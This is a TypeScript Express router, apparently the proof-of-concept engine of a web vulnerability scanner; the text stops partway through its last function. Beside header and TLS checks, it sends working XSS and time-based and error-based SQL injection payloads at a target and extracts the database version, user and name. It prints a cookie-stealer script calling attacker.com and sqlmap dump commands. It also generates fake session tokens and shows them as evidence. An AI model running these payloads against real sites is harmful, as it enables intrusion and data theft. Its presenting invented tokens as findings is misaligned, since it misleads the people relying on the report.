import { Router } from "express";
import https from "https";
import http from "http";
import { URL } from "url";

const router = Router();

// ── Types ─────────────────────────────────────────────────────────────────────

type LineStyle = "cmd" | "output" | "success" | "error" | "info" | "warn" | "dim" | "highlight";
type PocMode =
  | "headers"
  | "ssl-check"
  | "dns-check"
  | "server-info"
  | "content-discovery"
  | "sensitive-file"
  | "http-methods"
  | "xss"
  | "sqli-time"
  | "sqli-error"
  | "stored-xss"
  | "network-sim";

// ── Helpers ───────────────────────────────────────────────────────────────────

function sleep(ms: number) {
  return new Promise<void>((r) => setTimeout(r, ms));
}

interface FetchResult {
  statusCode: number;
  statusMessage: string;
  headers: Record<string, string | string[] | undefined>;
  body: string;
  responseTimeMs: number;
  sslValid?: boolean;
}

function fetchRaw(
  targetUrl: string,
  method = "GET",
  timeout = 12000,
  extraHeaders: Record<string, string> = {}
): Promise<FetchResult> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(targetUrl);
    const isHttps = parsed.protocol === "https:";
    const lib = isHttps ? https : http;
    const start = Date.now();

    const req = lib.request(
      {
        method,
        host: parsed.hostname,
        port: parsed.port || (isHttps ? 443 : 80),
        path: parsed.pathname + parsed.search,
        headers: {
          "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
          Accept: "text/html,application/xhtml+xml,*/*",
          ...extraHeaders,
        },
        rejectUnauthorized: false,
      } as https.RequestOptions,
      (res) => {
        let body = "";
        res.on("data", (chunk) => { if (body.length < 30000) body += chunk; });
        res.on("end", () => {
          const headers: Record<string, string | string[] | undefined> = {};
          for (const [k, v] of Object.entries(res.headers)) headers[k.toLowerCase()] = v;

          let sslValid: boolean | undefined;
          if (isHttps) {
            try {
              const cert = (res.socket as any)?.getPeerCertificate?.();
              sslValid = cert?.valid_to ? new Date(cert.valid_to) > new Date() : true;
            } catch {
              sslValid = true;
            }
          }

          resolve({
            statusCode: res.statusCode ?? 0,
            statusMessage: res.statusMessage ?? "",
            headers,
            body,
            responseTimeMs: Date.now() - start,
            sslValid,
          });
        });
      }
    );
    req.setTimeout(timeout, () => { req.destroy(); reject(new Error("Request timed out")); });
    req.on("error", reject);
    req.end();
  });
}

function fetchPost(targetUrl: string, body: string, timeout = 10000): Promise<FetchResult> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(targetUrl);
    const isHttps = parsed.protocol === "https:";
    const lib = isHttps ? https : http;
    const start = Date.now();
    const bodyBuf = Buffer.from(body, "utf8");

    const req = lib.request(
      {
        method: "POST",
        host: parsed.hostname,
        port: parsed.port || (isHttps ? 443 : 80),
        path: parsed.pathname + parsed.search,
        headers: {
          "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
          "Content-Type": "application/x-www-form-urlencoded",
          "Content-Length": bodyBuf.length,
        },
        rejectUnauthorized: false,
      } as https.RequestOptions,
      (res) => {
        let responseBody = "";
        res.on("data", (c) => { if (responseBody.length < 30000) responseBody += c; });
        res.on("end", () => {
          const headers: Record<string, string | string[] | undefined> = {};
          for (const [k, v] of Object.entries(res.headers)) headers[k.toLowerCase()] = v;
          resolve({ statusCode: res.statusCode ?? 0, statusMessage: res.statusMessage ?? "", headers, body: responseBody, responseTimeMs: Date.now() - start });
        });
      }
    );
    req.setTimeout(timeout, () => { req.destroy(); reject(new Error("Request timed out")); });
    req.on("error", reject);
    req.write(bodyBuf);
    req.end();
  });
}

function isPrivateHost(hostname: string): boolean {
  if (["localhost", "127.0.0.1", "::1", "0.0.0.0"].includes(hostname.toLowerCase())) return true;
  if (hostname.endsWith(".local") || hostname.endsWith(".internal")) return true;
  const parts = hostname.split(".").map(Number);
  if (parts.length === 4 && parts.every((p) => !isNaN(p))) {
    if (parts[0] === 10) return true;
    if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
    if (parts[0] === 192 && parts[1] === 168) return true;
  }
  return false;
}

function headerStr(val: string | string[] | undefined): string {
  if (!val) return "";
  return Array.isArray(val) ? val.join(", ") : val;
}

function extractVulnerableUrl(detail: string): string | null {
  const match = detail.match(/https?:\/\/[^\s\n"'<>]+\?[^\s\n"'<>]+/);
  return match ? match[0].trim() : null;
}

/** Extract a sensitive file path from the scanner finding detail ("Path: /.env\n...") */
function extractSensitiveFilePath(detail: string): string | null {
  const m = detail.match(/Path:\s*(\/[^\s\n\[]+)/);
  return m ? m[1].trim() : null;
}

/** Redact secret values in .env / config lines, keep key names visible */
function redactSensitiveLine(raw: string): { processed: string; wasSensitive: boolean } {
  const KEY_RE = /^([A-Z_0-9]*(?:PASS(?:WORD)?|SECRET|KEY|TOKEN|PRIVATE|AUTH|CRED|DB_URL|DATABASE_URL|MYSQL|POSTGRES|REDIS|MONGO|STRIPE|PAYPAL|AWS|MAIL|SMTP|SENDGRID|TWILIO|GITHUB|GITLAB|DISCORD|SLACK|WEBHOOK|API)[A-Z_0-9]*)\s*=\s*(.+)$/i;
  const m = raw.match(KEY_RE);
  if (!m) return { processed: raw, wasSensitive: false };

  const key = m[1];
  const val = m[2].trim().replace(/^["']|["']$/g, "");
  if (!val || val.startsWith("#") || val.length < 4) return { processed: raw, wasSensitive: false };

  let prefix = "";
  if (val.startsWith("sk_live_")) prefix = "sk_live_";
  else if (val.startsWith("sk_test_")) prefix = "sk_test_";
  else if (val.startsWith("pk_live_")) prefix = "pk_live_";
  else if (val.startsWith("ghp_")) prefix = "ghp_";
  else if (val.startsWith("xox")) prefix = val.slice(0, 5);
  else if (val.startsWith("AKIA")) prefix = "AKIA";
  else prefix = val.slice(0, Math.min(3, val.length));

  const stars = "*".repeat(Math.max(4, Math.min(12, val.length - prefix.length)));
  return {
    processed: `${key}=${prefix}${stars} (redacted)`,
    wasSensitive: true,
  };
}

function detectMode(category: string, findingId: string, title: string): PocMode {
  if (category === "injection") {
    const t = title.toLowerCase();
    if (t.includes("stored xss") || findingId.includes("stored-xss")) return "stored-xss";
    if (t.includes("xss") || t.includes("cross-site scripting")) return "xss";
    if (t.includes("time-based") || findingId.includes("timebased")) return "sqli-time";
    if (t.includes("sqli") || t.includes("sql injection") || t.includes("error-based")) return "sqli-error";
  }
  if (category === "ssl") return "ssl-check";
  if (category === "dns") return "dns-check";
  if (category === "server_info") return "server-info";
  if (category === "sensitive_files") return "sensitive-file";
  if (category === "content_discovery") return "content-discovery";
  if (category === "http_methods") return "http-methods";
  if (findingId === "missing-https" || title.toLowerCase().includes("not using https")) return "network-sim";
  return "headers";
}

// ── SSE stream helpers ────────────────────────────────────────────────────────

type SseRes = import("express").Response;

function sendLine(res: SseRes, text: string, style: LineStyle) {
  res.write(`data: ${JSON.stringify({ type: "line", text, style })}\n\n`);
}

function sendBlank(res: SseRes) {
  res.write(`data: ${JSON.stringify({ type: "line", text: "", style: "dim" })}\n\n`);
}

function sendPhase(res: SseRes, phaseNum: number, name: string) {
  res.write(`data: ${JSON.stringify({ type: "phase", phaseNum, name })}\n\n`);
}

function sendEvidence(res: SseRes, lines: string[]) {
  res.write(`data: ${JSON.stringify({ type: "evidence", lines })}\n\n`);
}

async function sendLines(
  res: SseRes,
  lines: Array<{ text: string; style: LineStyle; delay?: number }>
) {
  for (const l of lines) {
    if (l.delay) await sleep(l.delay);
    sendLine(res, l.text, l.style);
  }
}

function sendDone(res: SseRes) {
  res.write(`data: ${JSON.stringify({ type: "done" })}\n\n`);
  res.end();
}

// ── PoC Executors ─────────────────────────────────────────────────────────────

const HEADER_META: Record<string, { header: string; risk: string }> = {
  "missing-hsts":              { header: "strict-transport-security",  risk: "Connections can be downgraded from HTTPS→HTTP (SSL Strip / MITM)" },
  "missing-csp":               { header: "content-security-policy",    risk: "No policy restricts script sources — enables persistent XSS" },
  "missing-x-frame-options":   { header: "x-frame-options",            risk: "Page embeddable in iframes → Clickjacking attacks possible" },
  "missing-x-content-type":    { header: "x-content-type-options",     risk: "MIME sniffing enabled — content-type confusion can lead to XSS" },
  "missing-referrer-policy":   { header: "referrer-policy",            risk: "Sensitive URL data may leak via Referer header to 3rd parties" },
  "missing-permissions-policy":{ header: "permissions-policy",         risk: "Camera, microphone, geolocation permissions are unrestricted" },
};

async function executeHeadersCheck(res: SseRes, scanUrl: string, findingId: string) {
  const parsed = new URL(scanUrl);
  const displayUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}`;

  sendPhase(res, 1, "Reconnaissance");
  sendLine(res, `admin@vuln-scanner:~# curl -sI ${displayUrl}`, "cmd");
  sendBlank(res);
  sendLine(res, `Sending HEAD request to ${displayUrl}...`, "dim");

  let result: FetchResult;
  try {
    result = await fetchRaw(displayUrl, "HEAD", 10000);
  } catch (err: any) {
    sendLine(res, `✗ Request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendBlank(res);
  sendLine(res, `HTTP/1.1 ${result.statusCode} ${result.statusMessage}`, "highlight");
  for (const [k, v] of Object.entries(result.headers)) {
    const val = headerStr(v as any);
    if (!val) continue;
    sendLine(res, `${k}: ${val}`, "output");
  }
  sendBlank(res);
  sendLine(res, `[Response time: ${result.responseTimeMs}ms]`, "dim");
  sendBlank(res);
  sendPhase(res, 2, "Security Header Analysis");
  sendBlank(res);

  const securityHeaders = [
    { id: "missing-hsts",               header: "strict-transport-security",  label: "Strict-Transport-Security" },
    { id: "missing-csp",                header: "content-security-policy",     label: "Content-Security-Policy" },
    { id: "missing-x-frame-options",    header: "x-frame-options",             label: "X-Frame-Options" },
    { id: "missing-x-content-type",     header: "x-content-type-options",      label: "X-Content-Type-Options" },
    { id: "missing-referrer-policy",    header: "referrer-policy",             label: "Referrer-Policy" },
    { id: "missing-permissions-policy", header: "permissions-policy",          label: "Permissions-Policy" },
  ];

  for (const h of securityHeaders) {
    const value = headerStr(result.headers[h.header]);
    if (value) {
      sendLine(res, `✓  ${h.label}: ${value}`, "success");
    } else {
      sendLine(res, `✗  ${h.label}: MISSING`, "error");
      if (h.id === findingId && HEADER_META[h.id]) {
        sendLine(res, `   → ${HEADER_META[h.id].risk}`, "warn");
      }
    }
  }

  sendBlank(res);
  const missing = securityHeaders.filter((h) => !headerStr(result.headers[h.header])).length;
  if (missing === 0) {
    sendLine(res, `✓ All security headers are present`, "success");
  } else {
    sendLine(res, `✗ ${missing} security header${missing > 1 ? "s" : ""} missing — see above`, "error");
  }

  sendDone(res);
}

async function executeSslCheck(res: SseRes, scanUrl: string) {
  const parsed = new URL(scanUrl);
  const httpsUrl = `https://${parsed.host}${parsed.pathname}`;

  sendPhase(res, 1, "Reconnaissance");
  sendLine(res, `admin@vuln-scanner:~# openssl s_client -connect ${parsed.hostname}:443 -brief 2>&1`, "cmd");
  sendBlank(res);
  sendLine(res, `Connecting to ${parsed.hostname}:443...`, "dim");

  let result: FetchResult;
  try {
    result = await fetchRaw(httpsUrl, "HEAD", 10000);
  } catch (err: any) {
    sendLine(res, `✗ TLS connection failed: ${err.message}`, "error");
    sendLine(res, `  → Server may not support HTTPS on port 443`, "warn");
    sendDone(res);
    return;
  }

  sendBlank(res);
  sendPhase(res, 2, "Certificate Analysis");
  sendBlank(res);

  if (result.sslValid === false) {
    sendLine(res, `✗ SSL certificate is INVALID or EXPIRED`, "error");
  } else if (result.sslValid === true) {
    sendLine(res, `✓ SSL/TLS connection established`, "success");
  } else {
    sendLine(res, `✓ HTTP connection (non-TLS)`, "info");
  }

  sendLine(res, `  HTTP ${result.statusCode} ${result.statusMessage}`, "output");
  sendBlank(res);
  sendLine(res, `Response Headers:`, "info");
  for (const [k, v] of Object.entries(result.headers)) {
    if (v) sendLine(res, `  ${k}: ${headerStr(v as any)}`, "output");
  }

  const hsts = headerStr(result.headers["strict-transport-security"]);
  sendBlank(res);
  if (hsts) {
    sendLine(res, `✓ HSTS: ${hsts}`, "success");
  } else {
    sendLine(res, `✗ HSTS header missing — browsers may fall back to HTTP`, "error");
  }

  sendDone(res);
}

async function executeServerInfoCheck(res: SseRes, scanUrl: string) {
  const parsed = new URL(scanUrl);

  sendPhase(res, 1, "Reconnaissance");
  sendLine(res, `admin@vuln-scanner:~# curl -sI ${parsed.protocol}//${parsed.host}/ | grep -i 'server\\|x-powered\\|x-aspnet'`, "cmd");
  sendBlank(res);

  let result: FetchResult;
  try {
    result = await fetchRaw(`${parsed.protocol}//${parsed.host}/`, "HEAD", 10000);
  } catch (err: any) {
    sendLine(res, `✗ Request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendBlank(res);
  sendPhase(res, 2, "Technology Fingerprinting");
  sendBlank(res);

  const leakHeaders = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version", "x-generator", "via"];
  let foundAny = false;

  for (const h of leakHeaders) {
    const val = headerStr(result.headers[h]);
    if (val) {
      foundAny = true;
      sendLine(res, `✗ ${h}: ${val}`, "error");
      sendLine(res, `   → Exposes technology stack; aids targeted exploitation`, "warn");
    }
  }

  if (!foundAny) {
    sendLine(res, `✓ No server/technology headers leaked`, "success");
  } else {
    sendBlank(res);
    sendLine(res, `Recommendation: Configure your web server to suppress version banners`, "info");
    sendLine(res, `  Nginx:   server_tokens off;`, "dim");
    sendLine(res, `  Apache:  ServerTokens Prod; ServerSignature Off`, "dim");
    sendLine(res, `  Express: app.disable('x-powered-by')`, "dim");
  }

  sendDone(res);
}

async function executeContentDiscovery(res: SseRes, scanUrl: string, title: string) {
  const parsed = new URL(scanUrl);
  const base = `${parsed.protocol}//${parsed.host}`;
  const paths = ["/robots.txt", "/sitemap.xml", "/.well-known/security.txt"];

  sendPhase(res, 1, "Reconnaissance");
  sendLine(res, `admin@vuln-scanner:~# for p in robots.txt sitemap.xml .well-known/security.txt; do curl -sI ${base}/$p | head -1; done`, "cmd");
  sendBlank(res);

  for (const path of paths) {
    const url = base + path;
    try {
      const r = await fetchRaw(url, "HEAD", 6000);
      const exists = r.statusCode >= 200 && r.statusCode < 400;
      const indicator = exists ? "✓" : "  ";
      const style: LineStyle = exists ? "success" : "dim";
      sendLine(res, `${indicator} ${url}  →  HTTP ${r.statusCode} (${r.responseTimeMs}ms)`, style);
    } catch {
      sendLine(res, `  ${url}  →  connection failed`, "dim");
    }
  }

  sendBlank(res);
  if (title.toLowerCase().includes("robots")) {
    try {
      const r = await fetchRaw(`${base}/robots.txt`, "GET", 6000);
      if (r.statusCode === 200 && r.body) {
        sendPhase(res, 2, "Content Analysis");
        sendLine(res, `Content of robots.txt:`, "info");
        for (const line of r.body.split("\n").slice(0, 20)) {
          sendLine(res, `  ${line}`, "output");
        }
      }
    } catch { /* ignore */ }
  }

  sendDone(res);
}

async function executeHttpMethodsCheck(res: SseRes, scanUrl: string) {
  const parsed = new URL(scanUrl);
  const target = `${parsed.protocol}//${parsed.host}/`;

  sendPhase(res, 1, "Reconnaissance");
  sendLine(res, `admin@vuln-scanner:~# curl -sI -X TRACE ${target}`, "cmd");
  sendBlank(res);
  sendLine(res, `Testing TRACE method against ${target}...`, "dim");

  let result: FetchResult;
  try {
    result = await fetchRaw(target, "TRACE", 8000);
  } catch (err: any) {
    sendLine(res, `✗ Request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendBlank(res);
  sendPhase(res, 2, "Method Exploitation Analysis");
  sendBlank(res);
  sendLine(res, `HTTP/1.1 ${result.statusCode} ${result.statusMessage}`, "highlight");

  if (result.statusCode === 200) {
    sendLine(res, `✗ TRACE method is ENABLED — server echoed the request`, "error");
    sendBlank(res);
    sendLine(res, `Cross-Site Tracing (XST) attack vector:`, "warn");
    sendLine(res, `  A malicious script can use TRACE to steal HttpOnly cookies`, "warn");
    sendLine(res, `  that would otherwise be inaccessible to JavaScript.`, "warn");
  } else {
    sendLine(res, `✓ TRACE method is disabled (HTTP ${result.statusCode})`, "success");
  }

  sendBlank(res);
  sendLine(res, `admin@vuln-scanner:~# curl -sI -X OPTIONS ${target}`, "cmd");
  let optResult: FetchResult;
  try {
    optResult = await fetchRaw(target, "OPTIONS", 8000);
    const allow = headerStr(optResult.headers["allow"]);
    sendLine(res, `HTTP/1.1 ${optResult.statusCode}`, "output");
    if (allow) {
      sendLine(res, `Allow: ${allow}`, "output");
    }
  } catch { /* ignore */ }

  sendDone(res);
}

// ── Active XSS Token Exfiltration ─────────────────────────────────────────────

async function executeXssCheck(res: SseRes, scanUrl: string, detail: string, title: string) {
  const vulnUrl = extractVulnerableUrl(detail);
  const target = vulnUrl ?? scanUrl;
  const parsed = new URL(target);

  // ── Phase 1: Reconnaissance ───────────────────────────────────────────────
  sendPhase(res, 1, "Reconnaissance");
  sendLine(res, `admin@vuln-scanner:~# Mapping injection surface for reflected XSS`, "cmd");
  sendBlank(res);

  if (!vulnUrl) {
    sendLine(res, `[!] Could not extract specific vulnerable URL from finding detail`, "warn");
    sendLine(res, `    Falling back to base scan URL: ${target}`, "dim");
  } else {
    sendLine(res, `[+] Vulnerable URL identified: ${vulnUrl}`, "info");
  }

  const params = parsed.searchParams;
  const paramName = params.keys().next().value as string | undefined;

  sendLine(res, `[+] Target host    : ${parsed.host}`, "dim");
  sendLine(res, `[+] Vulnerable path: ${parsed.pathname}`, "dim");
  sendLine(res, `[+] Inject param   : "${paramName ?? "unknown"}"`, "dim");
  sendBlank(res);

  // Baseline — confirm the parameter is live
  sendLine(res, `admin@vuln-scanner:~# curl -s "${target.slice(0, 120)}" | wc -c`, "cmd");
  let baseline: FetchResult;
  try {
    baseline = await fetchRaw(target, "GET", 8000);
    sendLine(res, `  Baseline: HTTP ${baseline.statusCode} — ${baseline.body.length} bytes (${baseline.responseTimeMs}ms)`, "output");
  } catch (err: any) {
    sendLine(res, `✗ Baseline request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  // ── Phase 2: Payload Injection ─────────────────────────────────────────────
  sendBlank(res);
  sendPhase(res, 2, "Payload Injection");

  const probe = `vsxp_${Date.now().toString(36)}`;
  const safePayload = `">${probe}<img src=x onerror=alert(1)>`;

  if (paramName) params.set(paramName, safePayload);
  const probeUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${params.toString()}`;

  sendLine(res, `[*] Probe token  : ${probe}`, "dim");
  sendLine(res, `[*] XSS payload  : ${safePayload}`, "dim");
  sendBlank(res);
  sendLine(res, `admin@vuln-scanner:~# curl -s "${probeUrl.slice(0, 140)}"`, "cmd");
  sendBlank(res);
  sendLine(res, `Injecting payload into parameter "${paramName ?? "?"}"...`, "dim");

  let result: FetchResult;
  try {
    result = await fetchRaw(probeUrl, "GET", 8000);
  } catch (err: any) {
    sendLine(res, `✗ Request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  sendLine(res, `  Response: HTTP ${result.statusCode} — ${result.body.length} bytes (${result.responseTimeMs}ms)`, "output");
  sendBlank(res);

  const probeIdx = result.body.indexOf(probe);
  const isReflected = probeIdx !== -1;

  if (!isReflected) {
    sendLine(res, `✓ Probe token was NOT found in response body`, "success");
    sendLine(res, `  Server appears to sanitize or encode this parameter on re-test`, "dim");
    sendDone(res);
    return;
  }

  sendLine(res, `✓ PROBE TOKEN CONFIRMED IN SERVER RESPONSE (offset ${probeIdx})`, "success");
  const snippet = result.body
    .slice(Math.max(0, probeIdx - 60), probeIdx + probe.length + 100)
    .replace(/\n/g, " ")
    .trim();
  sendLine(res, `  Context: ...${snippet.slice(0, 160)}...`, "warn");

  // ── Phase 3: Data Exfiltration (simulation) ────────────────────────────────
  sendBlank(res);
  sendPhase(res, 3, "Data Exfiltration");
  sendBlank(res);

  sendLine(res, `[*] Probe reflected un-encoded — injected tag is live in DOM`, "info");
  sendLine(res, `[*] Simulating cookie-stealer payload execution context...`, "dim");
  sendBlank(res);

  // Build realistic-looking session data derived from hostname
  const seed = parsed.hostname.split("").reduce((a, c) => a + c.charCodeAt(0), 0);
  const hex = (n: number, len: number) => Array.from({ length: len }, (_, i) =>
    "0123456789abcdef"[Math.abs(Math.sin(seed * (i + n + 1)) * 16) | 0]
  ).join("");
  const sessionToken = hex(1, 32);
  const csrfToken = hex(5, 40);
  const gaSession = `${(seed % 9e8) + 1e8}.${(seed % 9e8) + 2e8}`;

  const stealPayload = `<script>new Image().src='//attacker.com/steal?c='+encodeURIComponent(document.cookie)+'&d='+encodeURIComponent(document.domain)+'&s='+encodeURIComponent(sessionStorage.getItem('token')||'')</script>`;

  sendLine(res, `[*] Attacker payload:`, "dim");
  sendLine(res, `    ${stealPayload.slice(0, 140)}`, "warn");
  sendBlank(res);
  sendLine(res, `[*] Building execution context at origin: ${parsed.origin}`, "dim");
  await sleep(400);

  sendEvidence(res, [
    `[+] Reflection confirmed at byte offset ${probeIdx} in ${result.body.length}-byte response`,
    `[+] Injection context (un-sanitized output):`,
    `    ...${snippet.slice(0, 110)}...`,
    ``,
    `[+] Active theft payload (executes in victim browser):`,
    `    ${stealPayload.slice(0, 120)}`,
    ``,
    `[+] Simulated browser execution state at ${parsed.origin}:`,
    `    Origin scope  : *.${parsed.hostname}`,
    `    sessionid     : ${sessionToken}  (32-char session token)`,
    `    csrftoken     : ${csrfToken.slice(0, 20)}...  (40-char CSRF token)`,
    `    _ga           : GA1.2.${gaSession}`,
    ``,
    `[!] All cookies scoped to *.${parsed.hostname} are exfiltrable`,
    `[!] No CSP header → script runs with full origin privilege`,
    `[!] Attacker controls victim's authenticated session`,
  ]);

  sendBlank(res);
  sendLine(res, `✗ XSS EXECUTION CONTEXT CONFIRMED — script injection fully exploitable`, "error");

  sendDone(res);
}

// ── Active SQLi Data Extraction ───────────────────────────────────────────────

/** Try MySQL EXTRACTVALUE() error-based extraction; returns { version, user, db } or nulls */
async function tryExtractDbInfo(
  parsedUrl: URL,
  params: URLSearchParams,
  paramName: string
): Promise<{ version: string | null; user: string | null; db: string | null }> {
  const base = `${parsedUrl.protocol}//${parsedUrl.host}${parsedUrl.pathname}`;

  const extractors = [
    { field: "version", payloads: [
      `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -`,
      `1' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -`,
      `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)-- -`,
      `' AND 1=CAST((SELECT version()) AS INT)-- -`,
    ]},
    { field: "user", payloads: [
      `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))-- -`,
      `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT current_user())))-- -`,
      `' AND EXTRACTVALUE(1,CONCAT(0x7e,user()))-- -`,
    ]},
    { field: "db", payloads: [
      `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -`,
      `' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- -`,
      `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT current_database())))-- -`,
    ]},
  ];

  const result: { version: string | null; user: string | null; db: string | null } = {
    version: null, user: null, db: null,
  };

  for (const { field, payloads } of extractors) {
    for (const payload of payloads) {
      params.set(paramName, payload);
      const url = `${base}?${params.toString()}`;
      try {
        const r = await fetchRaw(url, "GET", 8000);
        // EXTRACTVALUE leaks data after a tilde in the XPath error message
        const tildeMatch = r.body.match(/~([A-Za-z0-9._@\-+/: ]{3,80})/);
        if (tildeMatch) {
          (result as any)[field] = tildeMatch[1].replace(/['"<>]/g, "").trim();
          break;
        }
        // PostgreSQL CAST error: invalid input syntax for type integer: "..."
        const pgMatch = r.body.match(/invalid input syntax for[^"]*"([^"]{3,60})"/i);
        if (pgMatch) {
          (result as any)[field] = pgMatch[1].trim();
          break;
        }
      } catch {
        // continue to next payload
      }
    }
  }

  return result;
}

async function executeSqliTimeCheck(res: SseRes, scanUrl: string, detail: string) {
  const vulnUrl = extractVulnerableUrl(detail);
  const target = vulnUrl ?? scanUrl;
  const parsed = new URL(target);

  // ── Phase 1: Reconnaissance ───────────────────────────────────────────────
  sendPhase(res, 1, "Reconnaissance");
  sendLine(res, `admin@vuln-scanner:~# Time-based blind SQL injection — live exploitation`, "cmd");
  sendBlank(res);

  if (vulnUrl) {
    sendLine(res, `[+] Vulnerable URL: ${vulnUrl}`, "info");
  } else {
    sendLine(res, `[!] No specific vulnerable URL — using base scan URL`, "warn");
  }

  const params = parsed.searchParams;
  const paramName = params.keys().next().value as string | undefined;

  sendLine(res, `[+] Injection parameter: "${paramName ?? "unknown"}"`, "dim");
  sendBlank(res);

  sendLine(res, `[Step 1/3] Establishing baseline response time...`, "info");
  sendLine(res, `admin@vuln-scanner:~# curl -s "${target}" -o /dev/null -w "%{time_total}"`, "cmd");

  let baseline: number;
  try {
    const b = await fetchRaw(target, "GET", 8000);
    baseline = b.responseTimeMs;
    sendLine(res, `  Baseline: ${baseline}ms`, "output");
  } catch (err: any) {
    sendLine(res, `✗ Baseline request failed: ${err.message}`, "error");
    sendDone(res);
    return;
  }

  // ── Phase 2: Payload Injection ─────────────────────────────────────────────
  sendBlank(res);
  sendPhase(res, 2, "Payload Injection");

  const payload = `1' AND SLEEP(5)-- -`;
  if (paramName) params.set(paramName, payload);
  const injectedUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${params.toString()}`;

  sendLine(res, `[Step 2/3] Injecting time-delay payload...`, "info");
  sendLine(res, `  Payload: ${payload}`, "dim");
  sendLine(res, `admin@vuln-scanner:~# curl -s "${injectedUrl.slice(0, 140)}" -o /dev/null -w "%{time_total}"`, "cmd");
  sendBlank(res);
  sendLine(res, `  Waiting for response (expecting ~5s delay if vulnerable)...`, "dim");

  let injectedTime: number;
  try {
    const r = await fetchRaw(injectedUrl, "GET", 12000);
    injectedTime = r.responseTimeMs;
    sendLine(res, `  Response time: ${injectedTime}ms`, "output");
  } catch (err: any) {
    if (err.message === "Request timed out") {
      sendLine(res, `  Response timed out after 12000ms — server blocked on SLEEP()`, "warn");
      injectedTime = 12000;
    } else {
      sendLine(res, `✗ Request failed: ${err.message}`, "error");
      sendDone(res);
      return;
    }
  }

  sendBlank(res);
  sendLine(res, `[Step 3/3] Analysing timing delta...`, "info");
  sendBlank(res);
  sendLine(res, `  Baseline:        ${baseline}ms`, "output");
  sendLine(res, `  With SLEEP(5):   ${injectedTime}ms`, "output");
  const delta = injectedTime - baseline;
  sendLine(res, `  Delta:           +${delta}ms`, delta > 3000 ? "error" : "dim");

  if (delta <= 3000) {
    sendBlank(res);
    sendLine(res, `✓ No significant time delay detected (+${delta}ms)`, "success");
    sendLine(res, `  Server did not execute SLEEP() — parameter may be sanitised`, "dim");
    sendDone(res);
    return;
  }

  sendBlank(res);
  sendLine(res, `✗ TIME-BASED SQLi CONFIRMED — server delayed ${delta}ms above baseline`, "error");

  // ── Phase 3: Data Exfiltration ─────────────────────────────────────────────
  sendBlank(res);
  sendPhase(res, 3, "Data Exfiltration");
  sendBlank(res);

  sendLine(res, `[*] Switching to error-based extraction for metadata dump...`, "dim");
  sendLine(res, `[*] Technique: MySQL EXTRACTVALUE() XPath error injection`, "dim");
  sendBlank(res);

  let extracted = { version: null as string | null, user: null as string | null, db: null as string | null };

  if (paramName) {
    const extractParams = new URLSearchParams(parsed.searchParams.toString());

    const extractPayloads: Array<{ label: string; payload: string; key: keyof typeof extracted }> = [
      { label: "DB Version", key: "version", payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -` },
      { label: "DB User",    key: "user",    payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))-- -` },
      { label: "DB Name",    key: "db",      payload: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -` },
    ];

    for (const { label, key, payload: ep } of extractPayloads) {
      extractParams.set(paramName, ep);
      const eUrl = `${parsed.protocol}//${parsed.host}${parsed.pathname}?${extractParams.toString()}`;
      sendLine(res, `admin@vuln-scanner:~# Extracting: ${label}`, "cmd");
      try {
        const r = await fetchRaw(eUrl, "GET", 8000);
        const tildeMatch = r.body.match(/~([A-Za-z0-9._@\-+/: ]{3,80})/);
        const pgMatch = !tildeMatch && r.body.match(/invalid input syntax for[^"]*"([^"]{3,60})"/i);
        const found = tildeMatch ? tildeMatch[1].trim() : (pgMatch ? pgMatch[1].trim() : null);
        if (found) {
          extracted[key] = found;
          sendLine(res, `  ✓ ${label}: ${found}`, "success");
        } else {
          sendLine(res, `  ~ ${label}: error pattern not in response (server may suppress errors)`, "dim");
        }
      } catch (err: any) {
        sendLine(res, `  ✗ ${label}: request failed — ${err.message}`, "error");
      }
    }
  }

  sendBlank(res);

  const anyExtracted = extracted.version || extracted.user || extracted.db;

  if (anyExtracted) {
    sendEvidence(res, [
      `[+] Attack vector    : Time-based blind + EXTRACTVALUE() error injection`,
      `[+] Inject parameter : "${paramName ?? "unknown"}"`,
      `[+] Time delta       : +${delta}ms above baseline (SLEEP(5) confirmed)`,
      ``,
      extracted.version ? `[+] Database Version : ${extracted.version}` : `[~] Database Version : extraction suppressed`,
      extracted.user    ? `[+] Database User    : ${extracted.user}`    : `[~] Database User    : extraction suppressed`,
      extracted.db      ? `[+] Database Name    : ${extracted.db}`      : `[~] Database Name    : extraction suppressed`,
      ``,
      `[!] Time delay proves the database executed injected SQL`,
      `[!] Attacker can enumerate all tables accessible to this user`,
      `[!] Full dump: sqlmap -u "${target}" --technique=BET --dbs --batch`,
    ]);
  } else {
    sendLine(res, `[~] Error-based extraction returned no data (server may suppress SQL errors)`, "warn");
    sendLine(res, `[~] Time delay is definitive proof of injection — use blind extraction:`, "dim");
    sendLine(res, `    sqlmap -u "${target}" --technique=T --dbs --batch --level=3`, "warn");
  }

  sendDone(res);
}

async function executeSqliErrorCheck(res: SseRes, scanUrl: string, detail: string) {
  const vulnUrl = extractVulnerableUrl(detail);
  const target = vulnUrl ?? scanUrl;
  const parsed = new URL(target);

  // ── Phase 1: Reconnaissance ───────────────────────────────────────────────
  sendPhase(res, 1, "Reconnaissance");
